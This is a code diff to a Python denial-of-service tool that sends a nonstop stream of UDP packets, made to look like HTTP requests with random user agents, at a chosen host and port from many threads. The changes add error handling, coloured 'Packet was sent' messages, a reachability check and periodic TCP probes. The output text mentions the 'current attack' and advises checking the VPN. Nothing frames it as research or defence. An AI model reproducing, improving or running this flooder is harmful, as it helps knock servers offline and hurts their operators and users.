@@ -1,6 +1,7 @@
 from optparse import OptionParser
-import time, sys, socket, threading, random, urllib.request
+import time, sys, socket, threading, random, os
 
+os.system("cls")
 
 def user_agent():
     global uagent
@@ -32,14 +33,26 @@ def headers():
 
 
 def down_it():
+    i = 1
     while True:
         packet = str(
             "GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(uagent) + "\n" + data).encode(
             'utf-8')
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.sendto(packet, (host, int(port)))
+        try:
+            s.sendto(packet, (host, int(port)))
+        except socket.gaierror:
+            print("\033[91mCan't get server IP. Packet sending failed. Check your VPN.\033[0m")
+        else:
+            print('\033[92m Packet was sent \033[0;0m')
         s.close()
-        print('Packet was sent')
+
+        i += 1
+        if i == 50:
+            i = 1
+            thread = threading.Thread(target=connect_host)
+            thread.daemon = True
+            thread.start()
         time.sleep(.01)
 
 
@@ -85,10 +98,36 @@ def get_parameters():
         thr = opts.threads
 
 
+def check_host():
+    try:
+        socket.gethostbyname(host)
+    except:
+        return False
+    else:
+        return True
+
+
+def connect_host():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect((host, int(port)))
+    except:
+        print("\033[91mNo connection with server. It could be a reason of current attack or bad VPN connection."
+              " Program will continue send UDP-packets to the destination.\033[0m")
+
+
 if __name__ == '__main__':
     if len(sys.argv) < 2:
         usage()
     get_parameters()
+
+    if not check_host():
+        print("\033[91mCheck server ip and port! Wrong format of server name or no connection.\033[0m")
+        exit()
+
+    connect_host()
+
     print("\033[92m", host, " port: ", str(port), " threads: ", str(thr), "\033[0m")
     print("\033[94mPlease wait...\033[0m")
     user_agent()
